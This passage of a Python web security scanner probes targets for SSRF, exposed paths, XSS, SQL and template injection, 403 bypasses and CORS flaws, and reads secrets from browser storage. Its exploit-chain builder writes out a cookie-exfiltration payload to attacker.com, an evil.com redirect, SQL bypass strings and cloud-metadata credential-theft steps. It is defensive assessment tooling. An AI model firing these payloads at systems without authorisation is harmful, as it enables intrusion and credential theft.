                "http://metadata.google.internal/computeMetadata/v1/",
                "http://127.0.0.1:80",
            ]
            for probe in probes:
                if not probe: continue
                test_params = {**existing, **{p: probe for p in self.patterns.SSRF_PARAMS[:3]}}
                resp = self._make_request("GET", endpoint, params=test_params, allow_redirects=False, timeout=6)
                if not resp: continue
                if resp.status_code in (301, 302, 303, 307, 308):
                    loc = resp.headers.get("Location", "")
                    if probe in loc:
                        f = SSRFVulnFinding(
                            id=self._next_id("ssrf_vulnerabilities"),
                            type="Confirmed SSRF — API Redirect",
                            source_url=endpoint,
                            vulnerable_parameters=list(test_params.keys())[:5],
                            form_action=endpoint, method="get", confirmed=True,
                            poc=f"GET {endpoint}?{urllib.parse.urlencode({p: probe for p in self.patterns.SSRF_PARAMS[:3]})}",
                            severity="High", confidence="HIGH",
                            risk_score=self._risk_score("High", "HIGH"),
                            description=f"Server redirects to attacker-controlled URL: {loc[:120]}",
                            recommendation="Never use raw user input for server-side HTTP requests.",
                        )
                        if self._is_new(f.hash):
                            self._add_finding("ssrf_vulnerabilities", asdict(f))
                            self.logger.warning(f"[SSRF CONFIRMED] {endpoint} → {loc[:80]}")
                        break
        except Exception as e:
            self.logger.debug(f"SSRF probe {endpoint}: {e}")

    # ──────────────────────────────────────────────────────────────────────
    # L2 — ACTIVE: EXPOSED SENSITIVE PATH DISCOVERY
    # ──────────────────────────────────────────────────────────────────────

    def _scan_sensitive_paths(self):
        self.logger.info(f"[L2] Scanning {len(PatternRegistry.SENSITIVE_PATHS)} sensitive paths…")

        def check_path(entry: Dict):
            url  = urljoin(self.base_url, entry["path"])
            resp = self._make_request("GET", url, allow_redirects=False, timeout=8)
            if not resp: return
            # Positive if 200/206, or 401/403 (exists but protected — still noteworthy)
            if resp.status_code in (200, 206, 401, 403):
                ct      = resp.headers.get("Content-Type", "")
                sev     = entry["severity"]
                # 401/403 downgrades severity
                if resp.status_code in (401, 403) and sev == "Critical": sev = "High"
                # Extra check: body must have content for 200s
                if resp.status_code == 200 and len(resp.text.strip()) < 10: return
                evidence = f"HTTP {resp.status_code}"
                if resp.status_code == 200 and resp.text:
                    evidence += f" — {resp.text[:100].replace(chr(10), ' ').strip()}"
                f = ExposedEndpoint(
                    id=self._next_id("exposed_endpoints"),
                    url=url, status_code=resp.status_code,
                    content_type=ct, endpoint_type=entry["type"],
                    severity=sev, evidence=evidence,
                    recommendation=f"Restrict access to {entry['path']}. Return 404 for sensitive paths.",
                )
                h = self._shash(url + str(resp.status_code))
                if self._is_new(h):
                    self._add_finding("exposed_endpoints", asdict(f))
                    if sev in ("Critical", "High"):
                        self.logger.warning(f"[EXPOSED] {sev} — {entry['type']} @ {url}")

        with ThreadPoolExecutor(max_workers=min(self.max_workers, 20)) as ex:
            list(ex.map(check_path, PatternRegistry.SENSITIVE_PATHS))

    # ──────────────────────────────────────────────────────────────────────
    # L2 — ACTIVE: FORM FUZZING
    # ──────────────────────────────────────────────────────────────────────

    def _test_forms_active(self, soup: BeautifulSoup, page_url: str):
        if not self.fuzz_forms: return
        forms = soup.find_all("form")
        if not forms: return

        for form in forms[:3]:  # limit to 3 forms per page
            action = urljoin(page_url, form.get("action", page_url))
            method = form.get("method", "get").lower()
            fields = {}
            for inp in form.find_all(["input", "textarea"]):
                name = inp.get("name", "")
                if name and inp.get("type", "text") not in ("submit", "hidden", "button", "image"):
                    fields[name] = inp.get("value", "test")

            if not fields: continue

            # Test XSS + SQLi + SSTI
            for fuzz_type, payloads in [
                ("xss",  PatternRegistry.FUZZ_PAYLOADS["xss"][:3]),
                ("sqli", PatternRegistry.FUZZ_PAYLOADS["sqli"][:3]),
                ("ssti", PatternRegistry.FUZZ_PAYLOADS["ssti"][:2]),
            ]:
                for payload in payloads:
                    fuzz_data = {k: payload for k in fields}
                    try:
                        if method == "post":
                            resp = self._make_request("POST", action, data=fuzz_data, timeout=8, allow_redirects=True)
                        else:
                            resp = self._make_request("GET", action, params=fuzz_data, timeout=8, allow_redirects=True)

                        if not resp: continue
                        body = resp.text

                        # XSS reflection check — BeautifulSoup parse-based detection
                        # This is the ONLY reliable way: parse the response as HTML and check
                        # if dangerous tags/attributes are present as REAL DOM nodes.
                        # Fixes: "&lt;img onerror=alert&gt;" — encoded at tag boundary but
                        # event handler text is not; regex can't distinguish this reliably.
                        if fuzz_type == "xss" and "alert(1)" in body:
                            ct = resp.headers.get("Content-Type", "")
                            if "text/html" in ct and self._is_real_xss_in_body(body):
                                self._add_active_vuln(
                                    vuln_type="Reflected XSS",
                                    url=action, param=list(fields.keys())[0],
                                    payload=payload,
                                    evidence="Unencoded executable XSS payload confirmed via DOM parse",
                                    severity="High", confidence="HIGH",
                                    cvss="AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                                    description="User input reflected as executable HTML — event handler/script injection confirmed.",
                                    rec="HTML-encode all user output (htmlspecialchars). Implement strict CSP.",
                                    poc=f"{'POST' if method=='post' else 'GET'} {action}?{list(fields.keys())[0]}={payload}",
                                )

                        # SQLi error check
                        if fuzz_type == "sqli":
                            sqli_errors = [
                                "sql syntax", "mysql_fetch", "ora-01756",
                                "microsoft ole db", "unclosed quotation",
                                "pg_query", "sqlite_", "syntax error",
                                "division by zero", "invalid query",
                            ]
                            if any(e in body.lower() for e in sqli_errors):
                                self._add_active_vuln(
                                    vuln_type="SQL Injection",
                                    url=action, param=list(fields.keys())[0],
                                    payload=payload, evidence=f"SQL error in response",
                                    severity="Critical", confidence="HIGH",
                                    cvss="AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                                    description="Database error triggered by SQL metacharacters in input.",
                                    rec="Use parameterized queries / prepared statements. Never concatenate user input in SQL.",
                                    poc=f"{'POST' if method=='post' else 'GET'} {action} — {list(fields.keys())[0]}={payload}",
                                )

                        # SSTI check — DIFFERENTIAL: baseline + control required, never naive "49 in body"
                        if fuzz_type == "ssti" and payload == "{{7*7}}":
                            self._check_ssti_differential(action, method, fields)
                    except Exception as e:
                        self.logger.debug(f"Fuzz error {action}: {e}")

    @staticmethod
    def _is_real_xss_in_body(body: str) -> bool:
        """
        Determine if an XSS payload is EXECUTABLE in the response.
        Uses BeautifulSoup for DOM-level checks + string-literal stripping for script tags.

        Three separate checks:
        1. DOM tags: <img onerror=alert(1)> as a real HTML element (not encoded text)
        2. Script tags: alert(1) as executable code, not inside a JS string/comment
           (fixes Drupal.settings = {"query": "<img onerror=alert(1)>"} FP)
        3. javascript: protocol in href/src attributes
        """
        import re as _re

        try:
            soup = BeautifulSoup(body, "html.parser")
            danger_events = ["onerror", "onload", "onclick", "onmouseover",
                             "onfocus", "onblur", "oninput", "onsubmit"]

            # Check 1: Real DOM event handler attributes
            for ev in danger_events:
                for tag in soup.find_all(attrs={ev: True}):
                    if "alert" in str(tag.get(ev, "")):
                        return True

            # Check 2: <script> tags — alert must be OUTSIDE string literals and comments
            for tag in soup.find_all("script"):
                src = str(tag.string or "")
                if "alert" not in src:
                    continue
                # Strip comments and string literals so alert inside them doesn't fire
                clean = _re.sub(r'//[^\n]*', '', src)
                clean = _re.sub(r'/\*.*?\*/', '', clean, flags=_re.DOTALL)
                clean = _re.sub(r'"[^"]*"', '""', clean)
                clean = _re.sub(r"'[^']*'", "''", clean)
                clean = _re.sub(r'`[^`]*`', '``', clean)
                if _re.search(r'\balert\s*\(', clean):
                    return True

            # Check 3: javascript: protocol as actual attribute value
            for attr in ("href", "src", "action"):
                for tag in soup.find_all(attrs={attr: _re.compile(r"javascript:", _re.I)}):
                    if "alert" in str(tag.get(attr, "")):
                        return True

        except Exception:
            pass
        return False

    def _check_ssti_differential(self, action: str, method: str, fields: Dict):
        """
        Differential SSTI test — the only reliable way to detect SSTI without FPs.
        Three-step: baseline -> {{7*7}} payload -> {{8*8}} control.
        Flag ONLY if BOTH expressions evaluate AND neither result was in baseline.
        """
        param = list(fields.keys())[0]
        try:
            # Step 1: baseline
            baseline_data = {k: "scanner_baseline_xyz" for k in fields}
            if method == "post":
                baseline_resp = self._make_request("POST", action, data=baseline_data, timeout=8)
            else:
                baseline_resp = self._make_request("GET", action, params=baseline_data, timeout=8)
            baseline_body = baseline_resp.text if baseline_resp else ""

            # Step 2: {{7*7}} payload
            p1_data = {k: "{{7*7}}" for k in fields}
            if method == "post":
                p1_resp = self._make_request("POST", action, data=p1_data, timeout=8)
            else:
                p1_resp = self._make_request("GET", action, params=p1_data, timeout=8)
            p1_body = p1_resp.text if p1_resp else ""

            # Step 3: {{8*8}} control
            p2_data = {k: "{{8*8}}" for k in fields}
            if method == "post":
                p2_resp = self._make_request("POST", action, data=p2_data, timeout=8)
            else:
                p2_resp = self._make_request("GET", action, params=p2_data, timeout=8)
            p2_body = p2_resp.text if p2_resp else ""

            # Verdict: both must evaluate AND not in baseline AND payload not echoed raw
            forty_nine      = "49" in p1_body and "49" not in baseline_body
            sixty_four      = "64" in p2_body and "64" not in baseline_body
            payload_unencoded = "{{7*7}}" not in p1_body

            if forty_nine and sixty_four and payload_unencoded:
                self._add_active_vuln(
                    vuln_type="Server-Side Template Injection",
                    url=action, param=param,
                    payload="{{7*7}} / {{8*8}}",
                    evidence="Differential: both {{7*7}}->49 and {{8*8}}->64 evaluated; absent in baseline",
                    severity="Critical", confidence="HIGH",
                    cvss="AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                    description="Server-side template engine evaluates user-controlled expressions — RCE possible.",
                    rec="Never pass user input to template engines. Use sandboxed rendering.",
                    poc=f"{'POST' if method == 'post' else 'GET'} {action} -- {param}={{{{7*7}}}} -> 49 in response",
                )
        except Exception as e:
            self.logger.debug(f"SSTI differential {action}: {e}")

    def _add_active_vuln(self, vuln_type, url, param, payload, evidence,
                          severity, confidence, cvss, description, rec, poc):
        f = ActiveVulnFinding(
            id=self._next_id("active_vulnerabilities"),
            type=vuln_type, source_url=url, parameter=param,
            payload=payload, evidence=evidence,
            severity=severity, confidence=confidence,
            risk_score=self._risk_score(severity, confidence),
            cvss_vector=cvss, description=description,
            recommendation=rec, poc=poc,
        )
        if self._is_new(f.hash):
            self._add_finding("active_vulnerabilities", asdict(f))
            self.logger.warning(f"[ACTIVE] {severity} {vuln_type} @ {url} param={param}")

    # ──────────────────────────────────────────────────────────────────────
    # L2 — ACTIVE: AUTH BYPASS
    # ──────────────────────────────────────────────────────────────────────

    def _test_auth_bypass(self):
        if not self.test_auth_bypass: return
        self.logger.info("[L2] Testing auth bypass techniques…")

        # Collect 403 pages from visited URLs
        forbidden_pages = []
        for url in list(self.visited_urls)[:30]:
            resp = self._make_request("GET", url, allow_redirects=False, timeout=6)
            if resp and resp.status_code == 403:
                forbidden_pages.append(url)

        for url in forbidden_pages[:5]:
            # Test header-based bypass
            for header_set in PatternRegistry.FORBIDDEN_BYPASS_HEADERS:
                try:
                    resp = self._make_request("GET", url, headers=header_set, timeout=6)
                    if resp and resp.status_code == 200:
                        header_str = str(header_set)
                        self._add_active_vuln(
                            vuln_type="403 Bypass via Header",
                            url=url, param="Header", payload=header_str,
                            evidence=f"HTTP 403 → 200 with header {header_str}",
                            severity="High", confidence="HIGH",
                            cvss="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                            description="Access control bypassed by forging internal/proxy headers.",
                            rec="Validate access control server-side. Never trust X-Forwarded-For for authorization.",
                            poc=f"GET {url} — add header: {header_str}",
                        )
                except Exception: pass

            # Test path-based 403 bypass
            parsed = urlparse(url)
            bypass_paths = [
                parsed.path + "/", parsed.path + "//",
                parsed.path + "/..",
                "/" + parsed.path.lstrip("/").replace("/", "//"),
                parsed.path + "%20",
                parsed.path + "?",
                parsed.path + "#",
            ]
            for bp in bypass_paths:
                try:
                    bypass_url = f"{parsed.scheme}://{parsed.netloc}{bp}"
                    resp = self._make_request("GET", bypass_url, timeout=6)
                    if resp and resp.status_code == 200:
                        self._add_active_vuln(
                            vuln_type="403 Bypass via Path Manipulation",
                            url=url, param="path", payload=bp,
                            evidence=f"HTTP 403 → 200 with path: {bp}",
                            severity="High", confidence="MEDIUM",
                            cvss="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                            description="Access control bypassed via URL path manipulation.",
                            rec="Normalize URL paths before access control checks.",
                            poc=f"GET {bypass_url}",
                        )
                except Exception: pass

    # ──────────────────────────────────────────────────────────────────────
    # L2 — ACTIVE: CORS MISCONFIGURATION
    # ──────────────────────────────────────────────────────────────────────

    def _test_cors(self):
        if not self.test_cors: return
        self.logger.info("[L2] Testing CORS misconfiguration…")
        test_urls = [self.base_url] + list(self.api_endpoints)[:10]

        for url in test_urls:
            for origin in PatternRegistry.CORS_TEST_ORIGINS:
                try:
                    resp = self._make_request("GET", url,
                        headers={"Origin": origin, "Access-Control-Request-Method": "GET"},
                        timeout=6)
                    if not resp: continue
                    acao = resp.headers.get("Access-Control-Allow-Origin", "")
                    acac = resp.headers.get("Access-Control-Allow-Credentials", "")

                    if acao == "*":
                        self._add_active_vuln(
                            vuln_type="CORS Wildcard Origin",
                            url=url, param="Origin", payload=origin,
                            evidence=f"Access-Control-Allow-Origin: *",
                            severity="Medium", confidence="HIGH",
                            cvss="AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                            description="Wildcard CORS allows any site to read responses.",
                            rec="Specify explicit allowed origins. Never use * with credentials.",
                            poc=f"GET {url} — Origin: {origin} → ACAO: *",
                        )
                    elif origin in acao:
                        sev = "High" if acac.lower() == "true" else "Medium"
                        self._add_active_vuln(
                            vuln_type="CORS Origin Reflection" + (" with Credentials" if acac.lower() == "true" else ""),
                            url=url, param="Origin", payload=origin,
                            evidence=f"ACAO: {acao}, ACAC: {acac or 'not set'}",
                            severity=sev, confidence="HIGH",
                            cvss="AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N" if sev == "High" else "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                            description="Server reflects arbitrary Origin and allows credentials — full CORS attack possible.",
                            rec="Validate Origin against a strict allowlist. Never reflect Origin blindly.",
                            poc=f"GET {url} — Origin: {origin} → ACAO: {acao}, ACAC: {acac}",
                        )
                except Exception: pass

    # ──────────────────────────────────────────────────────────────────────
    # L2 — ACTIVE: NUCLEI INTEGRATION
    # ──────────────────────────────────────────────────────────────────────

    def _run_nuclei(self):
        if not self.nuclei_path:
            self.logger.info("[L2] Nuclei not found — skipping CVE template scan")
            return
        self.logger.info(f"[L2] Running Nuclei: {self.nuclei_path}")
        try:
            out_file = os.path.join(self.output_dir, "nuclei_output.json")
            cmd = [
                self.nuclei_path, "-u", self.base_url,
                "-json", "-o", out_file,
                "-severity", "medium,high,critical",
                "-timeout", "10", "-retries", "1",
                "-rate-limit", "30",
                "-silent",
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if os.path.exists(out_file):
                with open(out_file) as fh:
                    for line in fh:
                        line = line.strip()
                        if not line: continue
                        try:
                            item = json.loads(line)
                            sev  = item.get("info", {}).get("severity", "medium").capitalize()
                            self._add_active_vuln(
                                vuln_type=f"Nuclei: {item.get('info', {}).get('name', 'Unknown')}",
                                url=item.get("matched-at", self.base_url),
                                param="nuclei", payload=item.get("template-id", ""),
                                evidence=str(item.get("extracted-results", item.get("matched-at", "")))[:300],
                                severity=sev, confidence="HIGH",
                                cvss=item.get("info", {}).get("metadata", {}).get("cvss-metrics", "N/A"),
                                description=item.get("info", {}).get("description", ""),
                                rec=item.get("info", {}).get("remediation", "Review and patch identified vulnerability."),
                                poc=f"Template: {item.get('template-id', '')} — {item.get('matched-at', '')}",
                            )
                        except Exception: pass
                self.logger.info(f"[L2] Nuclei complete — results in {out_file}")
        except subprocess.TimeoutExpired:
            self.logger.warning("[L2] Nuclei timed out after 300s")
        except FileNotFoundError:
            self.logger.warning(f"[L2] Nuclei binary not found: {self.nuclei_path}")
        except Exception as e:
            self.logger.error(f"[L2] Nuclei error: {e}")

    # ──────────────────────────────────────────────────────────────────────
    # L4 — HEADLESS BROWSER (Playwright)
    # ──────────────────────────────────────────────────────────────────────

    def _run_headless_scan(self):
        if not self.headless or not PLAYWRIGHT_AVAILABLE:
            self.logger.info("[L4] Playwright not available — skipping headless scan")
            return
        self.logger.info("[L4] Starting Playwright headless browser scan…")
        try:
            with sync_playwright() as pw:
                browser = pw.chromium.launch(headless=True, args=["--no-sandbox"])
                ctx     = browser.new_context(ignore_https_errors=True)
                page    = ctx.new_page()
                captured_requests: List[str] = []

                page.on("request", lambda req: captured_requests.append(req.url))

                page.goto(self.base_url, timeout=20000, wait_until="networkidle")
                html = page.content()

                # Scan for runtime secrets in window/globalThis
                secrets_js = page.evaluate("""() => {
                    const keys = [];
                    const sensitive = /secret|token|key|password|api|auth/i;
                    try {
                        for (const k of Object.keys(window)) {
                            if (sensitive.test(k)) keys.push({key: k, val: String(window[k]).slice(0,100)});
                        }
                    } catch(e) {}
                    return keys;
                }""")
                for item in secrets_js:
                    entr = self._entropy(item["val"])
                    if entr > 3.5:
                        f = SecretFinding(
                            id=self._next_id("secrets"),
                            type="Runtime Window Secret",
                            source_url=self.base_url,
                            line=0,
                            masked_value=self._mask(item["val"]),
                            raw_length=len(item["val"]),
                            entropy=round(entr, 3),
                            context=f"window.{item['key']} = {item['val'][:60]}",
                            severity="High", confidence="HIGH",
                            risk_score=self._risk_score("High", "HIGH", entr),
                            recommendation="Never store secrets in global window object.",
                        )
                        if self._is_new(f.hash):
                            self._add_finding("secrets", asdict(f))
                            self.logger.warning(f"[L4] Runtime secret: window.{item['key']}")

                # localStorage / sessionStorage scan
                storage_js = page.evaluate("""() => {
                    const items = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        const k = localStorage.key(i);
                        items[k] = localStorage.getItem(k);
                    }
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const k = sessionStorage.key(i);
                        items['[session]' + k] = sessionStorage.getItem(k);
                    }
                    return items;
                }""")
                for key, val in storage_js.items():
                    if val and any(t in key.lower() for t in ("token", "key", "secret", "auth", "pass")):
                        entr = self._entropy(val)
                        if entr > 3.0:
                            f = SecretFinding(
                                id=self._next_id("secrets"),
                                type="Secret in Browser Storage",
                                source_url=self.base_url, line=0,
                                masked_value=self._mask(val),
                                raw_length=len(val),
                                entropy=round(entr, 3),
                                context=f"Storage key '{key}' = {val[:60]}",
                                severity="High", confidence="HIGH",
                                risk_score=self._risk_score("High", "HIGH", entr),
                                recommendation="Store tokens in HttpOnly cookies, not Web Storage.",
                            )
                            if self._is_new(f.hash):
                                self._add_finding("secrets", asdict(f))
                                self.logger.warning(f"[L4] Storage secret: {key}")

                # Add captured network requests as API endpoints
                for req_url in captured_requests:
                    if self._in_scope(req_url) and req_url not in self.visited_urls:
                        for pat in self._API_RE:
                            if re.search(pat, req_url):
                                with self._lock: self.api_endpoints.add(req_url)
                                break

                # Discover SPA routes by clicking nav elements
                nav_links = page.query_selector_all("a[href^='/'], nav a, [role='navigation'] a")
                clicked = 0
                for link in nav_links[:15]:
                    try:
                        href = link.get_attribute("href")
                        if href and not href.startswith(("http", "javascript", "#")):
                            abs_href = urljoin(self.base_url, href)
                            if abs_href not in self.visited_urls:
                                self._dynamic_routes.add(abs_href)
                                clicked += 1
                    except Exception: pass
                self.logger.info(f"[L4] Found {clicked} dynamic routes, {len(captured_requests)} network requests")

                # Scan headless-rendered HTML for secrets
                self._scan_secrets(html, f"{self.base_url}#headless-rendered")
                browser.close()
        except PWTimeout:
            self.logger.warning("[L4] Playwright timed out")
        except Exception as e:
            self.logger.error(f"[L4] Playwright error: {e}")

    # ──────────────────────────────────────────────────────────────────────
    # L5 — EXPLOIT CHAIN BUILDER
    # ──────────────────────────────────────────────────────────────────────

    def _build_exploit_chains(self):
        if not self.build_exploit_chains: return
        chains = []

        secrets  = self.findings["secrets"]
        js_vulns = self.findings["js_vulnerabilities"]
        active   = self.findings["active_vulnerabilities"]
        ssrf     = self.findings["ssrf_vulnerabilities"]
        exposed  = self.findings["exposed_endpoints"]

        # Chain 1: Exposed .env → Credential Exfiltration
        env_files = [e for e in exposed if ".env" in e.get("url", "") and e.get("status_code") == 200]
        if env_files:
            chains.append({
                "id": len(chains) + 1,
                "title": "Exposed .env → Direct Credential Exfiltration",
                "severity": "Critical",
                "risk_score": 10.0,
                "steps": [
                    f"1. Access {env_files[0]['url']}",
                    "2. Extract database credentials, API keys, and secret keys",
                    "3. Use credentials to authenticate to database / API services",
                    "4. Full application compromise",
                ],
                "mitre": "T1552.001 — Credentials in Files",
                "poc": f"curl -s {env_files[0]['url']}",
                "recommendation": "Immediately restrict access to .env files. Rotate all exposed credentials.",
            })

        # Chain 2: SQLi → Auth Bypass → Data Exfiltration
        sqli_findings = [a for a in active if "SQL Injection" in a.get("type", "")]
        if sqli_findings:
            chains.append({
                "id": len(chains) + 1,
                "title": "SQL Injection → Authentication Bypass → Data Exfiltration",
                "severity": "Critical",
                "risk_score": 9.8,
                "steps": [
                    f"1. Inject SQL payload into {sqli_findings[0].get('source_url', '')} param={sqli_findings[0].get('parameter', '')}",
                    "2. Bypass authentication with ' OR '1'='1",
                    "3. Use UNION-based injection to dump user table",
                    "4. Crack hashed passwords or use plaintext credentials",
                ],
                "mitre": "T1190 — Exploit Public-Facing Application",
                "poc": sqli_findings[0].get("poc", ""),
                "recommendation": "Use parameterized queries. Implement WAF rules.",
            })

        # Chain 3: XSS → Session Hijacking
        xss_findings = [a for a in active if "XSS" in a.get("type", "")]
        if xss_findings:
            chains.append({
                "id": len(chains) + 1,
                "title": "Reflected XSS → Session Token Theft → Account Takeover",
                "severity": "High",
                "risk_score": 8.5,
                "steps": [
                    f"1. Craft XSS payload in {xss_findings[0].get('source_url', '')}",
                    "2. Social-engineer victim to click malicious link",
                    "3. XSS payload exfiltrates document.cookie to attacker server",
                    "4. Attacker replays session token → account takeover",
                ],
                "mitre": "T1185 — Browser Session Hijacking",
                "poc": f"<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
                "recommendation": "Encode output. Set HttpOnly + Secure cookie flags. Implement CSP.",
            })

        # Chain 4: SSRF → Cloud Metadata → IAM Privilege Escalation
        confirmed_ssrf = [s for s in ssrf if s.get("confirmed")]
        if confirmed_ssrf:
            chains.append({
                "id": len(chains) + 1,
                "title": "Confirmed SSRF → Cloud Metadata → IAM Credential Theft",
                "severity": "Critical",
                "risk_score": 9.5,
                "steps": [
                    f"1. SSRF via {confirmed_ssrf[0].get('source_url', '')} param={confirmed_ssrf[0].get('vulnerable_parameters', [])}",
                    "2. Fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "3. Extract temporary AWS credentials (AccessKeyId, SecretAccessKey, Token)",
                    "4. Use credentials to access S3 buckets, enumerate IAM roles, escalate privileges",
                ],
                "mitre": "T1552.005 — Cloud Instance Metadata API",
                "poc": confirmed_ssrf[0].get("poc", ""),
                "recommendation": "Implement IMDSv2. Validate all URL inputs against allowlist.",
            })

        # Chain 5: Secret in JS → Direct API Abuse
        critical_secrets = [s for s in secrets if s.get("severity") == "Critical"]
        if critical_secrets:
            s = critical_secrets[0]
            chains.append({
                "id": len(chains) + 1,
                "title": f"Exposed {s.get('type')} → Direct API Service Abuse",
                "severity": "Critical",
                "risk_score": 9.0,
                "steps": [
                    f"1. Extract {s.get('type')} from {s.get('source_url')} line {s.get('line')}",
                    f"2. Value: {s.get('masked_value')} (entropy={s.get('entropy')})",
                    "3. Authenticate directly to the service API",
                    "4. Abuse service (run inference, send emails, access data, etc.)",
                ],
                "mitre": "T1552.001 — Credentials in Files",
                "poc": f"Use extracted credential to authenticate to {s.get('type')} service",
                "recommendation": s.get("recommendation", "Rotate immediately."),
            })

        if chains:
            self.findings["exploit_chains"] = chains
            self.logger.warning(f"[L5] Built {len(chains)} exploit chain(s)")

    # ──────────────────────────────────────────────────────────────────────
    # UTILITIES
    # ──────────────────────────────────────────────────────────────────────

    @staticmethod
    def _entropy(s: str) -> float:
        if not s: return 0.0
        freq: Dict[str, int] = defaultdict(int)
        for c in s: freq[c] += 1
        n = len(s)
        return -sum((v / n) * math.log2(v / n) for v in freq.values())

    @staticmethod
    def _mask(s: str) -> str:
        if len(s) <= 8: return s[:2] + "****"
        return s[:4] + "****" + s[-4:]

    @staticmethod
    def _shash(s: str) -> str:
        return hashlib.md5(s.encode(errors="replace")).hexdigest()[:10]

    def _fp_value(self, val: str) -> bool:
        for p in PatternRegistry.FP_VALUE_PATTERNS:
            if re.search(p, val, re.IGNORECASE): return True
        return False

    def _fp_context(self, ctx: str) -> bool:
        low = ctx.lower()
        return any(t in low for t in PatternRegistry.FP_CONTEXT_TERMS)

    def _sev_passes(self, sev: str) -> bool:
        return self._sev_order.get(sev.lower(), 0) >= self._sev_order.get(self.min_severity, 0)

    # ──────────────────────────────────────────────────────────────────────
    # DESCRIPTION / RECOMMENDATION TABLES
    # ──────────────────────────────────────────────────────────────────────

    _JS_DESCS: Dict[str, str] = {
        "DOM XSS":                          "User-controlled data flows into a DOM sink without sanitisation.",
        "Open Redirect":                    "User-controlled input determines the redirect target.",
        "Prototype Pollution":              "Object prototype manipulated via user-controlled keys.",
        "Dynamic Code Execution":           "Code executed dynamically with potentially unsanitised input.",
        "Insecure postMessage":             "postMessage uses wildcard origin or receiver skips origin validation.",
        "Sensitive Data in Client Storage": "Sensitive values persisted in localStorage / sessionStorage / cookie.",
        "WebSocket Plaintext":              "WebSocket connection uses unencrypted ws:// protocol.",
        "Weak / Broken Crypto":             "Deprecated or insecure cryptographic primitive in use.",
        "Path Traversal":                   "File path derived from user input — may allow directory traversal.",
        "JSONP Callback Injection":         "JSONP callback name sourced from user input — XSS risk.",
        "Server-Side Request Forgery (JS)": "fetch/axios/XHR URL constructed from user-controllable input.",
        "Debug / Secret Console Leak":      "Sensitive values logged to browser console via console.*.",
        "Hardcoded Internal IP":            "Internal/private IP address found in client-side code.",
        "Taint Flow: Source → Sink":        "User-controlled data flows from a tainted source to a dangerous sink.",
    }

    _JS_RECS: Dict[str, str] = {
        "DOM XSS":                          "Use DOMPurify for HTML; textContent instead of innerHTML for plain text.",
        "Open Redirect":                    "Allowlist permitted redirect targets; never use raw user input in location.*.",
        "Prototype Pollution":              "Use Object.create(null) for untrusted maps; validate keys against __proto__.",
        "Dynamic Code Execution":           "Eliminate eval()/new Function()/setTimeout(string). Use static imports.",
        "Insecure postMessage":             "Specify exact target origin; validate event.origin in message listeners.",
        "Sensitive Data in Client Storage": "Store tokens in HttpOnly cookies, not Web Storage.",
        "WebSocket Plaintext":              "Always use wss:// for all WebSocket connections.",
        "Weak / Broken Crypto":             "Use SHA-256+; replace Math.random() with crypto.getRandomValues().",
        "Path Traversal":                   "Use path.resolve() and verify result starts within the allowed base dir.",
        "JSONP Callback Injection":         "Replace JSONP endpoints with CORS-enabled JSON APIs.",
        "Server-Side Request Forgery (JS)": "Allowlist fetch destinations; never pass raw user URLs to fetch/axios.",
        "Debug / Secret Console Leak":      "Remove debug logging of sensitive values before production.",
        "Hardcoded Internal IP":            "Replace hardcoded IPs with environment-based service discovery.",
        "Taint Flow: Source → Sink":        "Sanitize all user-controlled data before passing to DOM sinks or fetch calls.",
    }

    _SEC_RECS: Dict[str, str] = {
        "AWS Access Key ID":            "Rotate via AWS IAM. Prefer IAM roles over static keys.",
        "AWS Secret Access Key":        "Rotate immediately. Use AWS Secrets Manager.",
        "Google API Key":               "Restrict scope and rotate. Never embed in frontend JS.",
        "OpenAI API Key":               "Rotate at platform.openai.com. Use server-side proxy.",
        "OpenAI API Key (new)":         "Rotate at platform.openai.com.",
        "Anthropic API Key":            "Rotate at console.anthropic.com.",
        "Stripe Secret Key":            "Rotate via Stripe dashboard. Never expose in frontend.",
        "GitHub PAT (classic)":         "Revoke at github.com → Settings → Developer settings → Tokens.",
        "SSH/PEM Private Key":          "Replace keypair on all servers. Never commit private keys.",
        "MongoDB Connection String":    "Rotate credentials. Store in secrets manager.",
        "HashiCorp Vault Token":        "Revoke: vault token revoke. Rotate service credentials.",
        "Generic High-Entropy Secret":  "Rotate/revoke immediately. Use a dedicated secrets manager.",
    }

    def _js_desc(self, cat: str) -> str:
        return self._JS_DESCS.get(cat, f"Potential security issue: {cat}")

    def _js_rec(self, cat: str) -> str:
        return self._JS_RECS.get(cat, "Apply appropriate input validation and sanitisation.")

    def _js_poc(self, cat: str, matched: str, url: str) -> str:
        pocs = {
            "DOM XSS":             f"Inject <img src=x onerror=alert(1)> into user-controlled input that flows to: {matched[:60]}",
            "Open Redirect":       f"Append ?redirect=https://evil.com to {url}",
            "SQL Injection":       f"Inject ' OR '1'='1 into parameter — check for database error",
            "SSRF":                f"Inject http://169.254.169.254/latest/meta-data/ as URL parameter",
            "Prototype Pollution": f"Send JSON: {{\"__proto__\": {{\"polluted\": true}}}} to endpoint",
        }
        for key, poc in pocs.items():
            if key in cat: return poc
        return f"Review {url} — matched: {matched[:80]}"

    def _sec_rec(self, name: str) -> str:
        return self._SEC_RECS.get(
            name,
            "Rotate/revoke immediately. Store secrets in a dedicated secrets manager.",
        )

    # ──────────────────────────────────────────────────────────────────────
    # SUMMARY + PERSISTENCE
    # ──────────────────────────────────────────────────────────────────────

    def _build_summary(self, duration: float):
        secs   = self.findings["secrets"]
        jsv    = self.findings["js_vulnerabilities"]
        ssrf   = self.findings["ssrf_vulnerabilities"]
        active = self.findings["active_vulnerabilities"]
        hdrs   = self.findings["security_headers"]
        exp    = self.findings["exposed_endpoints"]
        chains = self.findings["exploit_chains"]

        # Overall risk score
        all_scores = (
            [s.get("risk_score", 0) for s in secs] +
            [v.get("risk_score", 0) for v in jsv] +
            [a.get("risk_score", 0) for a in active] +
            [s.get("risk_score", 0) for s in ssrf]
        )
        overall_risk = round(max(all_scores) if all_scores else 0.0, 2)
